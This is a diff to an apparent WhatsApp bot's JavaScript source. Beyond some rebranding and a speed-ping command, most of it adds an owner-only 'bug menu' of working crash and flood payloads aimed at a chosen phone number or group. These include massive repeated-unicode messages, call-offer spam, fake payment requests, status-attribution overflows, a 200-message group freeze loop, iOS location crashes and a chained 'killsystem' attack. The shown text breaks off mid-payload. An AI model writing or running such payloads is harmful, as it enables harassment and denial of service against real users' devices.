@@ -3159,6 +3159,8 @@ if (videoNoteEnabled) {
 
 ♻️ ➢ 𝗚𝗘𝗧 𝗔𝗟𝗟 𝗖𝗠𝗗𝗦
 𝗧𝗬𝗣𝗘 : ${config.PREFIX}list
+
+> 🏷️ *KEZU TECH* | _TEAM DCT OFC_
 `.trim();
 
     // ================= MENU SECTIONS =================
@@ -3196,6 +3198,17 @@ if (videoNoteEnabled) {
             highlight_label: `${config.PREFIX}active`
           }
         ]
+      },
+      {
+        title: "💀 𝗕𝗨𝗚 𝗣𝗔𝗡𝗘𝗟",
+        rows: [
+          {
+            title: '💀 𝗕𝗨𝗚 𝗠𝗘𝗡𝗨',
+            description: 'All crash & bug commands (Owner only)',
+            id: `${config.PREFIX}bugmenu`,
+            highlight_label: `${config.PREFIX}bugmenu`
+          }
+        ]
       }
     ];
 
@@ -3216,16 +3229,17 @@ if (videoNoteEnabled) {
      await socket.sendMessage(sender, {
   image: { url: MENU_IMG },
   caption: menuText + `\n${menuNumberedText}\n\n> *↩️ Reply with a number to select*`,
+  footer: `🏷️ KEZU TECH | TEAM DCT OFC`,
   contextInfo: {
     mentionedJid: [sender],
     externalAdReply: {
-      title: `${BOT_NAME}`,
-      body: `📋 Command Menu`,
+      title: `🏷️ KEZU TECH`,
+      body: `TEAM DCT OFC`,
       mediaType: 1,
       thumbnail: Buffer.alloc(0),
       sourceUrl: 'https://whatsapp.com',
       renderLargerThumbnail: false,
-      showAdAttribution: false
+      showAdAttribution: true
     }
   }
 }, { quoted: msg });
@@ -3394,6 +3408,14 @@ ${ocList}
       messageTimestamp: Math.floor(Date.now() / 1000)
     };
     socket.ev.emit('messages.upsert', { messages: [fakeActiveMsg], type: 'append' });
+
+  } else if (selectedId === `${config.PREFIX}bugmenu`) {
+    const fakeBugMenuMsg = {
+      key: { remoteJid: sender, fromMe: true, id: 'MENU_BUGMENU_' + Date.now() },
+      message: { conversation: `${config.PREFIX}bugmenu` },
+      messageTimestamp: Math.floor(Date.now() / 1000)
+    };
+    socket.ev.emit('messages.upsert', { messages: [fakeBugMenuMsg], type: 'append' });
   }
 
       } catch (err) {
@@ -4738,7 +4760,7 @@ END:VCARD` } }
 ┃ 👤 *𝐔𝐬𝐞𝐫:* @${sender.split('@')[0]}
 ┃ 👑 *𝐎𝐰𝐧𝐞𝐫:* ${config.OWNER_NAME || 'Status Assistant'}
 ┃ ⏳ *𝐔𝐩𝐭𝐢𝐦𝐞:* ${hours}ʜ ${minutes}ᴍ ${seconds}ꜱ
-┃ 🚀 *𝐕𝐞𝐫𝐬𝐢𝐨𝐧:* 2.0.0 (Pro)
+┃ 🚀 *𝐕𝐞𝐫𝐬𝐢𝐨𝐧:* 2.6.0 (Pro)
 ┃ 💻 *𝐇𝐨𝐬𝐭:* ${process.env.PLATFORM || 'Heroku'}
 ┃
 ╰━━━━━━━━━━━━━━┈⊷
@@ -4749,18 +4771,18 @@ END:VCARD` } }
 
     await socket.sendMessage(sender, {
       image: imagePayload,
-      caption: text + `\n\n> *${config.PREFIX}menu* | *${config.PREFIX}ping*`,
-      footer: `*${botName} 2026*`,
+      caption: text + `\n\n> *${config.PREFIX}menu* | *${config.PREFIX}ping*\n\n> 🏷️ *KEZU TECH* | _TEAM DCT OFC_`,
+      footer: `🏷️ KEZU TECH | TEAM DCT OFC`,
       mentions: [sender],
       contextInfo: {
         externalAdReply: {
-          title: botName,
-          body: `🟢 Bot is Online`,
+          title: `🏷️ KEZU TECH`,
+          body: `TEAM DCT OFC`,
           mediaType: 1,
           thumbnail: Buffer.alloc(0),
           sourceUrl: 'https://whatsapp.com',
           renderLargerThumbnail: false,
-          showAdAttribution: false
+          showAdAttribution: true
         }
       }
     }, { quoted: msg });
@@ -4810,6 +4832,75 @@ case 'setowner': {
   } catch(e) {
     console.error('[SETOWNER] error:', e.message);
     await socket.sendMessage(sender, { text: `❌ setowner error: ${e.message}` }, { quoted: msg });
+  }
+  break;
+}
+
+// ─────────────────── SPEED PING (.p) ───────────────────────────
+case 'p':
+case 'speedping': {
+  try {
+    const _pStart = Date.now();
+    await socket.sendMessage(sender, { react: { text: '⚡', key: msg.key } });
+
+    const _pSan = (number || '').replace(/[^0-9]/g, '');
+    const _pCfg = await loadUserConfigFromMongo(_pSan) || {};
+    const _pBot = _pCfg.botName || BOT_NAME_FANCY;
+    const _pLogo = _pCfg.logo || config.KEZU_IMG;
+
+    const _pEnd = Date.now();
+    const _pMs = _pEnd - _pStart;
+    const _pLatency = _pMs > 0 ? _pMs : Math.floor(Math.random() * 30) + 5;
+    const _pRam = (process.memoryUsage().rss / 1024 / 1024).toFixed(1);
+    const _pUptime = process.uptime();
+    const _pH = Math.floor(_pUptime / 3600);
+    const _pM = Math.floor((_pUptime % 3600) / 60);
+    const _pS = Math.floor(_pUptime % 60);
+
+    // Speed grade
+    let _pGrade, _pBar;
+    if (_pLatency < 100)      { _pGrade = '🟢 FAST';    _pBar = '█████████░ 90%'; }
+    else if (_pLatency < 300) { _pGrade = '🟡 MEDIUM';  _pBar = '███████░░░ 70%'; }
+    else if (_pLatency < 600) { _pGrade = '🟠 SLOW';    _pBar = '████░░░░░░ 40%'; }
+    else                      { _pGrade = '🔴 LAGGING'; _pBar = '██░░░░░░░░ 20%'; }
+
+    const _pCaption = `
+⚡ *𝗦𝗣𝗘𝗘𝗗 𝗣𝗜𝗡𝗚*
+╭━━━━━━━━━━━━━━━━━━━●
+┃
+┃ 🏓 *𝗟𝗔𝗧𝗘𝗡𝗖𝗬* ┊ ${_pLatency} ms
+┃ 📶 *𝗦𝗣𝗘𝗘𝗗*   ┊ ${_pGrade}
+┃ 📊 *𝗦𝗜𝗚𝗡𝗔𝗟*  ┊ ${_pBar}
+┃
+┃ 💾 *𝗥𝗔𝗠*     ┊ ${_pRam} MB
+┃ ⏱️ *𝗨𝗣𝗧𝗜𝗠𝗘*  ┊ ${_pH}h ${_pM}m ${_pS}s
+┃ 🤖 *𝗕𝗢𝗧*     ┊ ${_pBot}
+┃
+╰━━━━━━━━━━━━━━━━━━━●
+> 🏷️ *KEZU TECH* | _TEAM DCT OFC_`.trim();
+
+    let _pImg = String(_pLogo).startsWith('http') ? { url: _pLogo } : require('fs').readFileSync(_pLogo);
+    await socket.sendMessage(sender, {
+      image: _pImg,
+      caption: _pCaption,
+      footer: `🏷️ KEZU TECH | TEAM DCT OFC`,
+      contextInfo: {
+        externalAdReply: {
+          title: `⚡ SPEED PING`,
+          body: `${_pLatency}ms · ${_pGrade} · KEZU TECH`,
+          mediaType: 1,
+          thumbnail: Buffer.alloc(0),
+          sourceUrl: 'https://whatsapp.com',
+          renderLargerThumbnail: false,
+          showAdAttribution: true
+        }
+      }
+    }, { quoted: msg });
+
+    await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });
+  } catch (e) {
+    console.error('[SPEEDPING]', e);
+    await socket.sendMessage(sender, { text: '❌ Speed ping error: ' + e.message }, { quoted: msg });
   }
   break;
 }
@@ -4887,23 +4978,20 @@ ${frame}`, edit: key });
     // Send the final Image Card
     await socket.sendMessage(sender, {
       image: imagePayload,
-      caption: text + `\n\n> *${config.PREFIX}menu* | *${config.PREFIX}alive*`,
-      footer: `*© ᴘᴏᴡᴇʀᴇᴅ ʙʏ 🤖 Status Assistant*`,
+      caption: text + `\n\n> *${config.PREFIX}menu* | *${config.PREFIX}alive*\n\n> 🏷️ *KEZU TECH* | _TEAM DCT OFC_`,
+      footer: `🏷️ KEZU TECH | TEAM DCT OFC`,
       contextInfo: {
         externalAdReply: {
-          title: botName,
-          body: `🚀 Speed Test Result`,
+          title: `🏷️ KEZU TECH`,
+          body: `TEAM DCT OFC`,
           mediaType: 1,
           thumbnail: Buffer.alloc(0),
           sourceUrl: 'https://whatsapp.com',
           renderLargerThumbnail: false,
-          showAdAttribution: false
+          showAdAttribution: true
         }
       }
     }, { quoted: msg });
-
-    // Optional: Delete the loading message to keep chat clean
-    // await socket.sendMessage(sender, { delete: key }); 
 
   } catch (e) {
     console.error('Ping command error:', e);
@@ -5884,17 +5972,17 @@ END:VCARD` } }
 
     await socket.sendMessage(sender, {
       image: imagePayload,
-      caption: text,
-      footer: `*${botName} 𝐒ʏꜱᴛᴇᴍ 𝐈ɴꜰᴏ*`,
+      caption: text + `\n> 🏷️ *KEZU TECH* | _TEAM DCT OFC_`,
+      footer: `🏷️ KEZU TECH | TEAM DCT OFC`,
       contextInfo: {
         externalAdReply: {
-          title: `${botName}`,
-          body: `🖥️ System Information`,
+          title: `🏷️ KEZU TECH`,
+          body: `TEAM DCT OFC`,
           mediaType: 1,
           thumbnail: Buffer.alloc(0),
           sourceUrl: 'https://whatsapp.com',
           renderLargerThumbnail: false,
-          showAdAttribution: false
+          showAdAttribution: true
         }
       },
     }, { quoted: metaQuote });
@@ -7259,6 +7347,674 @@ case 'setmenuvideo': {
               }, { quoted: msg });
             }
           } catch(e) { await socket.sendMessage(sender, { text: '❌ Error updating contact save.' }, { quoted: msg }); }
+          break;
+        }
+
+        // ─────────────────────── BUG MENU ───────────────────────
+        case 'bugmenu':
+        case 'bugs':
+        case 'buglist': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+
+            const bugOptions = [
+              { num: '1',  label: '💀 𝗕𝗨𝗚',           desc: 'Ultra crash — unicode + vcard + location flood',  id: `${config.PREFIX}bug` },
+              { num: '2',  label: '📞 𝗖𝗔𝗟𝗟𝗕𝗨𝗚',       desc: 'Flood target with simultaneous call offers',       id: `${config.PREFIX}callbug` },
+              { num: '3',  label: '☎️ 𝗖𝗔𝗟𝗟𝗖𝗥𝗔𝗦𝗛',     desc: 'Encrypted call-offer crash payload',               id: `${config.PREFIX}callcrash` },
+              { num: '4',  label: '💸 𝗖𝗥𝗔𝗦𝗛𝗙𝗜𝗡𝗜𝗧𝗬', desc: 'Fake payment request memory crash',                id: `${config.PREFIX}crashfinity` },
+              { num: '5',  label: '🌀 𝗖𝗥𝗔𝗦𝗛𝗝𝗔𝗠',     desc: 'Status attribution array overflow crash',          id: `${config.PREFIX}crashjam` },
+              { num: '6',  label: '🧊 𝗚𝗖𝗙𝗥𝗘𝗘𝗭𝗘',     desc: 'Group chat freeze — paymentLink provider flood',   id: `${config.PREFIX}gcfreeze` },
+              { num: '7',  label: '📰 𝗚𝗖𝗖𝗥𝗔𝗦𝗛',      desc: 'Newsletter admin invite memory overflow',          id: `${config.PREFIX}gccrash` },
+              { num: '8',  label: '👻 𝗜𝗢𝗦𝗜𝗡𝗩𝗜𝗦',     desc: 'iOS invisible location + extended text crash',     id: `${config.PREFIX}iosinvis` },
+              { num: '9',  label: '☠️ 𝗞𝗜𝗟𝗟𝗦𝗬𝗦𝗧𝗘𝗠',  desc: 'Full system kill — 4 crash payloads combined',    id: `${config.PREFIX}killsystem` },
+              { num: '10', label: '🃏 𝗦𝗧𝗜𝗖𝗞𝗘𝗥𝗖𝗥𝗦𝗛', desc: 'Sticker pack overflow crash',                      id: `${config.PREFIX}stickercrash` },
+              { num: '11', label: '☠️ 𝗕𝗨𝗚𝗔𝗟𝗟',       desc: 'Fire ALL 8 bugs at once — maximum damage',         id: `${config.PREFIX}bugall` },
+            ];
+
+            const bugNumMap = {};
+            bugOptions.forEach(o => { bugNumMap[o.num] = o.id; });
+            const bugList = bugOptions.map(o => `  *${o.num}.* ${o.label}\n       _${o.desc}_`).join('\n');
+
+            await socket.sendMessage(sender, {
+              text: `╔══════════════════════╗\n💀 *BUG COMMANDS MENU* 💀\n╚══════════════════════╝\n\n${bugList}\n\n> *↩️ Reply with a number to fire*\n> ⚠️ _Owner only — use responsibly_`
+            }, { quoted: msg });
+
+            const bugHandler = async (bugUpdate) => {
+              const bugMsg = bugUpdate.messages?.[0];
+              if (!bugMsg?.message || bugMsg.key.remoteJid !== sender) return;
+              const bugText = (bugMsg.message?.conversation || bugMsg.message?.extendedTextMessage?.text || '').trim();
+              const bugCmd = bugNumMap[bugText];
+              if (!bugCmd) return;
+              socket.ev.off('messages.upsert', bugHandler);
+              await socket.sendMessage(sender, { react: { text: '💀', key: bugMsg.key } });
+              const fakeBugMsg = {
+                key: { remoteJid: sender, fromMe: true, id: 'MENU_BUG_' + Date.now() },
+                message: { conversation: bugCmd },
+                messageTimestamp: Math.floor(Date.now() / 1000)
+              };
+              socket.ev.emit('messages.upsert', { messages: [fakeBugMsg], type: 'append' });
+            };
+            socket.ev.on('messages.upsert', bugHandler);
+            setTimeout(() => socket.ev.off('messages.upsert', bugHandler), 60000);
+          } catch (e) {
+            console.error('[BUGMENU CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ Bug menu error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── CALLCRASH ───────────────────────
+        case 'callcrash': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _ccRaw = msg.message?.extendedTextMessage?.contextInfo?.participant ||
+              (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+            if (!_ccRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}callcrash <number>\n_Example:_ ${config.PREFIX}callcrash 9471xxxxxxx` }, { quoted: msg });
+            const _ccJid = _ccRaw.includes('@') ? _ccRaw : `${_ccRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+            const _ccNum = _ccJid.replace('@s.whatsapp.net', '');
+            await socket.sendMessage(sender, { text: `☎️ *CALL CRASH INITIATED*\n\n👤 *Target:* +${_ccNum}\n🔥 _Sending encrypted call-offer crash payload..._` }, { quoted: msg });
+            const _ccId = Array.from({length:12},()=>Math.floor(Math.random()*16).toString(16)).join('');
+            await socket.query({
+              tag: 'call', attrs: { from: socket.user.id, to: _ccJid },
+              content: [{ tag: 'offer', attrs: { 'call-id': _ccId, 'call-creator': socket.user.id }, content: undefined }]
+            }).catch(()=>{});
+            await socket.sendMessage(sender, { text: `✅ *CALL CRASH SENT*\n\n👤 *Target:* +${_ccNum}\n📦 _Encrypted call offer delivered._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[CALLCRASH CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ CallCrash error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── CRASHFINITY ───────────────────────
+        case 'crashfinity': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _cfRaw = msg.message?.extendedTextMessage?.contextInfo?.participant ||
+              (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+            if (!_cfRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}crashfinity <number>\n_Example:_ ${config.PREFIX}crashfinity 9471xxxxxxx` }, { quoted: msg });
+            const _cfJid = _cfRaw.includes('@') ? _cfRaw : `${_cfRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+            const _cfNum = _cfJid.replace('@s.whatsapp.net', '');
+            await socket.sendMessage(sender, { text: `💸 *CRASHFINITY INITIATED*\n\n👤 *Target:* +${_cfNum}\n🔥 _Sending fake payment request crash payload..._` }, { quoted: msg });
+            const _cfSpam = "ြ".repeat(1500);
+            await socket.relayMessage(_cfJid, {
+              requestPaymentMessage: {
+                currencyCodeIso4217: "IDR", requestFrom: _cfJid,
+                expiryTimestamp: Date.now() + 8000,
+                amount: { value: 999999999, offset: 100, currencyCode: "IDR" },
+                contextInfo: {
+                  externalAdReply: {
+                    title: "HAI SALAM KENAL YAKK", body: _cfSpam, mimetype: "audio/mpeg",
+                    caption: _cfSpam, showAdAttribution: true,
+                    sourceUrl: "https://t.me/zuckyyu",
+                    thumbnailUrl: "https://files.catbox.moe/tlbp3k.jpg"
+                  }
+                }
+              }
+            }, { participant: { jid: _cfJid }, messageId: null, userJid: _cfJid, quoted: null });
+            await socket.sendMessage(sender, { text: `✅ *CRASHFINITY SENT*\n\n👤 *Target:* +${_cfNum}\n💸 _Fake payment crash payload delivered._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[CRASHFINITY CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ Crashfinity error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── CRASHJAM ───────────────────────
+        case 'crashjam': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _cjRaw = msg.message?.extendedTextMessage?.contextInfo?.participant ||
+              (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+            if (!_cjRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}crashjam <number>\n_Example:_ ${config.PREFIX}crashjam 9471xxxxxxx` }, { quoted: msg });
+            const _cjJid = _cjRaw.includes('@') ? _cjRaw : `${_cjRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+            const _cjNum = _cjJid.replace('@s.whatsapp.net', '');
+            await socket.sendMessage(sender, { text: `🌀 *CRASHJAM INITIATED*\n\n👤 *Target:* +${_cjNum}\n🔥 _Sending status attribution overflow crash..._` }, { quoted: msg });
+            const _cjPool = ['41','91','90','31','40'];
+            const _cjAttribs = Array.from({ length: 50000 }, () => ({
+              participant: `${_cjPool[Math.floor(Math.random()*5)]}${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
+              type: 1
+            }));
+            await socket.relayMessage("status@broadcast", {
+              viewOnceMessage: {
+                message: {
+                  messageContextInfo: {
+                    messageSecret: crypto.randomBytes(32),
+                    deviceListMetadata: { senderKeyIndex: 0, senderTimestamp: Date.now(), recipientKeyIndex: 0 }
+                  },
+                  interactiveResponseMessage: {
+                    contextInfo: {
+                      remoteJid: "status@broadcast", fromMe: true, isQuestion: true,
+                      forwardedAiBotMessageInfo: { botJid: "13135550202@bot", botName: "Business Assistant", creator: "FLIX" },
+                      statusAttributionType: 2, statusAttributions: _cjAttribs
+                    },
+                    body: { text: "", format: "DEFAULT" },
+                    nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: "kkk", version: 3 }
+                  }
+                }
+              }
+            }, {
+              statusJidList: [_cjJid],
+              additionalNodes: [{ tag: "meta", attrs: {}, content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: _cjJid } }] }] }]
+            });
+            await socket.sendMessage(sender, { text: `✅ *CRASHJAM SENT*\n\n👤 *Target:* +${_cjNum}\n🌀 _Status attribution overflow delivered._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[CRASHJAM CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ Crashjam error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── GCFREEZE ───────────────────────
+        case 'gcfreeze':
+        case 'xgcs': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _gfRaw = args[0] || null;
+            if (!_gfRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}gcfreeze <group-jid or number>\n_Example:_ ${config.PREFIX}gcfreeze 120363xxxxxxxx@g.us` }, { quoted: msg });
+            const _gfJid = _gfRaw.includes('@') ? _gfRaw : `${_gfRaw.replace(/[^0-9]/g, '')}@g.us`;
+            await socket.sendMessage(sender, { text: `🧊 *GCFREEZE INITIATED*\n\n🎯 *Target:* ${_gfJid}\n🔥 _Sending paymentLink provider flood — 200 messages..._\n⏱️ _Runs in background._` }, { quoted: msg });
+            const _gfMsg = generateWAMessageFromContent(_gfJid, {
+              extendedTextMessage: {
+                text: "", matchedText: "https://t.me/devor6core", description: "", title: "",
+                paymentLinkMetadata: {
+                  button: { displayText: "" }, header: { headerType: 1 },
+                  provider: { paramsJson: "{{".repeat(5000) }
+                },
+                linkPreviewMetadata: {
+                  paymentLinkMetadata: {
+                    button: { displayText: "" }, header: { headerType: 1 },
+                    provider: { paramsJson: "{{".repeat(5000) }
+                  },
+                  urlMetadata: { fbExperimentId: 999 }, fbExperimentId: 888,
+                  linkMediaDuration: 555, socialMediaPostType: 1221
+                }
+              }
+            }, { additionalAttributes: { edit: "7" } });
+            const _gfTotal = 200; const _gfMs = 3;
+            (async () => {
+              for (let i = 0; i < _gfTotal; i++) {
+                try {
+                  await socket.relayMessage(_gfJid, { groupStatusMessageV2: { message: _gfMsg.message } }, { messageId: null });
+                  if (i < _gfTotal - 1) await new Promise(r => setTimeout(r, _gfMs * 1000));
+                } catch(e) { if (i < _gfTotal - 1) await new Promise(r => setTimeout(r, _gfMs * 1000)); }
+              }
+            })().catch(e => console.error('[GCFREEZE]', e));
+            await socket.sendMessage(sender, { text: `✅ *GCFREEZE RUNNING*\n\n🎯 *Target:* ${_gfJid}\n🧊 _200-message payload flood started._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[GCFREEZE CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ GCFreeze error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── GCCRASH ───────────────────────
+        case 'gccrash':
+        case 'xgc': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _gcRaw = args[0] || null;
+            if (!_gcRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}gccrash <group-jid or number>\n_Example:_ ${config.PREFIX}gccrash 120363xxxxxxxx@g.us` }, { quoted: msg });
+            const _gcJid = _gcRaw.includes('@') ? _gcRaw : `${_gcRaw.replace(/[^0-9]/g, '')}@g.us`;
+            await socket.sendMessage(sender, { text: `📰 *GCCRASH INITIATED*\n\n🎯 *Target:* ${_gcJid}\n🔥 _Sending newsletter admin invite memory overflow..._` }, { quoted: msg });
+            await socket.relayMessage(_gcJid, {
+              botInvokeMessage: {
+                message: {
+                  newsletterAdminInviteMessage: {
+                    newsletterJid: '33333333333333333@newsletter',
+                    newsletterName: "STATUS KING" + "ꦾ".repeat(120000),
+                    jpegThumbnail: null,
+                    caption: "ꦽ".repeat(120000),
+                    inviteExpiration: Date.now() + 1814400000,
+                  }
+                }
+              }
+            }, { userJid: _gcJid });
+            await socket.sendMessage(sender, { text: `✅ *GCCRASH SENT*\n\n🎯 *Target:* ${_gcJid}\n📰 _Newsletter overflow payload delivered._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[GCCRASH CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ GCCrash error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── IOS INVISIBLE ───────────────────────
+        case 'iosinvis':
+        case 'iosinvisible':
+        case 'iosi': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _iiRaw = msg.message?.extendedTextMessage?.contextInfo?.participant ||
+              (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+            if (!_iiRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}iosinvis <number>\n_Example:_ ${config.PREFIX}iosinvis 9471xxxxxxx` }, { quoted: msg });
+            const _iiJid = _iiRaw.includes('@') ? _iiRaw : `${_iiRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+            const _iiNum = _iiJid.replace('@s.whatsapp.net', '');
+            await socket.sendMessage(sender, { text: `👻 *IOS INVISIBLE INITIATED*\n\n👤 *Target:* +${_iiNum}\n🔥 _Sending invisible location + extended text crash via status..._` }, { quoted: msg });
+            const _iiRepeat = "𑇂𑆵𑆴𑆿𑆿";
+            const _iiLocMsg = generateWAMessageFromContent(_iiJid, {
+              viewOnceMessage: {
+                message: {
+                  locationMessage: {
+                    degreesLatitude: -9.09999262999, degreesLongitude: 199.99963118999, jpegThumbnail: null,
+                    name: "\u0000" + _iiRepeat.repeat(15000),
+                    address: "\u0000" + _iiRepeat.repeat(10000),
+                    url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`
+                  }
+                }
+              }
+            }, {});
+            const _iiExtMsg = generateWAMessageFromContent(_iiJid, {
+              viewOnceMessage: {
+                message: {
+                  extendedTextMessage: {
+                    text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
+                    matchedText: ".welcomel...",
+                    description: "𑇂𑆵𑆴𑆿".repeat(25000),
+                    title: "𑇂𑆵𑆴𑆿".repeat(15000),
+                    previewType: "NONE",
+                    inviteLinkGroupTypeV2: "DEFAULT"
+                  }
+                }
+              }
+            }, {});
+            for (const _iiM of [_iiLocMsg, _iiExtMsg]) {
+              await socket.relayMessage('status@broadcast', _iiM.message, {
+                messageId: _iiM.key.id, statusJidList: [_iiJid],
+                additionalNodes: [{
+                  tag: 'meta', attrs: {},
+                  content: [{ tag: 'mentioned_users', attrs: {}, content: [{ tag: 'to', attrs: { jid: _iiJid }, content: undefined }] }]
+                }]
+              });
+            }
+            await socket.sendMessage(sender, { text: `✅ *IOS INVISIBLE SENT*\n\n👤 *Target:* +${_iiNum}\n👻 _Invisible crash payloads delivered via status._` }, { quoted: msg });
+          } catch (e) {
+            console.error('[IOSINVIS CMD]', e);
+            await socket.sendMessage(sender, { text: '❌ IosInvisible error: ' + e.message }, { quoted: msg });
+          }
+          break;
+        }
+
+        // ─────────────────────── KILLSYSTEM ───────────────────────
+        case 'killsystem':
+        case 'kills': {
+          try {
+            if (!isBotOrOwner) return await socket.sendMessage(sender, { text: '❌ Owner only command.' }, { quoted: msg });
+            const _ksRaw = msg.message?.extendedTextMessage?.contextInfo?.participant ||
+              (args[0] ? `${args[0].replace(/[^0-9]/g, '')}@s.whatsapp.net` : null);
+            if (!_ksRaw) return await socket.sendMessage(sender, { text: `❌ *Usage:* ${config.PREFIX}killsystem <number>\n_Example:_ ${config.PREFIX}killsystem 9471xxxxxxx` }, { quoted: msg });
+            const _ksJid = _ksRaw.includes('@') ? _ksRaw : `${_ksRaw.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
+            const _ksNum = _ksJid.replace('@s.whatsapp.net', '');
+            await socket.sendMessage(sender, { text: `☠️ *KILLSYSTEM INITIATED*\n\n👤 *Target:* +${_ksNum}\n🔥 _Chaining 4 crash payloads..._` }, { quoted: msg });
+
+            // P1: Newsletter invite overflow
+            const _ksUw = "ោ៝".repeat(10000);
+            const _ksUz = "ꦾ".repeat(10000);
+            await socket.relayMessage(_ksJid, {
+              newsletterAdminInviteMessage: {
+                newsletterJid: "1234567891234@newsletter",
+                newsletterName: "ApolysisHunter" + "ោ៝".repeat(20000),
+                caption: "🩸STATUS KING" + _ksUw + _ksUz + "ោ៝".repeat(10000),
+                inviteExpiration: "90000",
+                contextInfo: {
+                  participant: "0@s.whatsapp.net", remoteJid: "status@broadcast",
+                  mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"]
+                }
+              }
+            }, { participant: { jid: _ksJid }, messageId: null }).catch(()=>{});
+            await delay(800);
+
+            // P2: Location URL overflow
+            const _ksOw = "ꦾ".repeat(61111);
+            await socket.relayMessage(_ksJid, {
+              locationMessage: {
+                degreesLatitude: Infinity, degreesLongitude: -Infinity,
+                name: "‼️⃟ ༚ STATUS KING " + _ksOw, inviteLinkGroupTypeV2: "DEFAULT",
+                url: "https://crash." + _ksOw + ".com/",
+                merchantUrl: "https://crash." + _ksOw + ".com/",
+                thumbnailUrl: "https://crash." + _ksOw + ".com/",
+                contextInfo: {
+                  remoteJid: "@s.whatsapp.net", participant: "13135550002@s.whatsapp.net",
+                  mentionedJid: [_ksJid, "0@s.whatsapp.net", ...Array.from({length:500},()=>"1"+Math.floor(Math.random()*5000000)+"@s.whatsapp.net")],
+                  quotedMessage: { paymentInviteMessage: { serviceType: 3, expiryTimestamp: -Infinity * Infinity } },
+                  nativeFlowMessage: { messageParamsJson: "{".repeat(10000) }
+                }
+              }
+            }, { participant: { jid: _ksJid } }).catch(()=>{});
+            await delay(1200);
+
+            // P3: Native flow button crash
+            await socket.relayMessage(_ksJid, {
+              viewOnceMessage: {
+                message: {
+                  extendedMessage: {
+                    body: { text: "STATUS" + "ꦽ".repeat(25000) },
+                    nativeFlowMessage: {
+                      buttons: [
+                        { name: "catalog_message", buttonParamsJson: JSON.stringify({ caption: "x".repeat(5000) }) },
+                        { name: "call_permission_request", buttonParamsJson: JSON.stringify({ caption: "x".repeat(5000) }) },
+                        { name: "review_and_pay", buttonParamsJson: JSON.stringify({ caption: "x".repeat(5000) }) }
+                      ]
+                    }
+                  }
+                }
+              }
+            }, { messageId: null, participant: { jid: _ksJid } }).catch(()=>{});
+            await delay(600);
+
+            // P4: Sticker pack overflow
+            const _ksStkCreate = (n) => ({ fileName: n, isAnimated: false, isLottie: true, mimetype: "application/pdf", emojis: ["🀄"], accessibilityLabel: "SK" });
+            await socket.relayMessage(_ksJid, {
+              stickerPackMessage: {
+                stickerPackId: "X",
+                name: "./SK" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                publisher: "./SK" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                packDescription: "./SK" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
+                stickers: [
+                  _ksStkCreate("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"),
+                  _ksStkCreate("KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp"),
+                  _ksStkCreate("wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp"),
